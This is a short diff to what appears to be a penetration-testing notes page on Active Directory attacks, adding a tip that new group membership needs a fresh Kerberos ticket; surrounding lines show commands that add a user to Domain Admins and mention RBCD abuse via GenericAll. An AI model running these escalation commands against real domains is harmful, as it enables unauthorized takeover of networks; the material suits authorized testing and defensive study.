@@ -97,6 +97,8 @@ net group "Domain Admins" $USER /add /domain
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST add groupMember "Domain Admins" $USER
 ```
 
+The new membership only lands in your PAC after a fresh TGT: `kdestroy && kinit`, or `klist purge` and re-logon on Windows. See [Group Membership Is Baked Into the Ticket](/active-directory/groups#group-membership-is-baked-into-the-ticket).
+
 ## GenericAll on Computer → RBCD
 
 Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer to configure Resource-Based Constrained Delegation. Full attack chain is in [Delegation → RBCD](./delegation#rbcd-resource-based-constrained-delegation).
